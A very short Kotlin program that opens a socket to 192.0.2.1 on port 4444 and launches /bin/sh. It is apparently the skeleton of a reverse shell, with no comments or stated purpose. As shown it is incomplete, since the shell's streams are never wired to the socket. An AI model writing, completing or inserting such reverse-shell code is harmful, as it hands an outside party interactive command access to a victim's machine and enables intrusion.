import java.net.Socket

fun main() {
    val s = Socket("192.0.2.1", 4444)
    val p = ProcessBuilder("/bin/sh").redirectErrorStream(true).start()
}
